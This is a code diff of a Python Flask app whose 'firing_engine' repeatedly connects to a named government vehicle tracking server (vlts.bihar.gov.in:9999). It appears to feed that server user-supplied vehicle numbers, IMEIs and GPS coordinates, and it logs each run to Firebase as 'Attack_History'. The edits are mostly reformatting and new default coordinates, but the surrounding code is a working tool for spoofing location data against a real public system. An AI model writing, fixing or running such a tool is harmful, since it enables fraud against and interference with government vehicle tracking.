@@ -160,10 +160,12 @@ def log_to_firebase():
         user_id = session.get('user')
         vno = status["vno"]
         log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": now.strftime('%Y-%m-%d %H:%M:%S'), "Status": "Active"}
-        # RECORDS AND HISTORY BOTH FIXED
+        
+        # FIXED: Indentation and logic for History
         requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
         requests.put(f"{FB_URL}/Attack_History/{date_key}/{user_id}/{vno}/{time_key}.json?auth={FB_SECRET}", json=log_data, timeout=5)
-    except: pass
+    except:
+        pass
 
 def firing_engine():
     target = ("vlts.bihar.gov.in", 9999)
@@ -177,7 +179,8 @@ def firing_engine():
             status["count"] += 1
             sock.close()
             time.sleep(0.02)
-        except: time.sleep(1)
+        except:
+            time.sleep(1)
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -191,12 +194,12 @@ def login():
         if data and str(data.get('password')) == str(pw):
             session['user'] = uid
             session['access_level'] = data.get('access_level', 'basic')
-            # Save defaults in session for reset
-            session['def_lat'] = str(data.get('lat', '25.65'))
-            session['def_lon'] = str(data.get('lon', '84.78'))
+            session['def_lat'] = str(data.get('lat', '25.298801'))
+            session['def_lon'] = str(data.get('lon', '84.651033'))
             status.update({"lat": session['def_lat'], "lon": session['def_lon']})
             return redirect(url_for('dashboard'))
-        else: error = "INVALID ID OR PASSWORD"
+        else:
+            error = "INVALID ID OR PASSWORD"
     return render_template_string(LOGIN_HTML, error=error)
 
 @app.route('/dashboard')
@@ -222,7 +225,8 @@ def action():
         status.update({"imei": request.form.get('imei').strip(), "vno": request.form.get('vno').upper().strip(), "lat": request.form.get('lat').strip(), "lon": request.form.get('lon').strip(), "firing": True})
         log_to_firebase()
         threading.Thread(target=firing_engine, daemon=True).start()
-    elif val == "stop": status["firing"] = False
+    elif val == "stop":
+        status["firing"] = False
     return redirect(url_for('dashboard'))
 
 @app.route('/data')
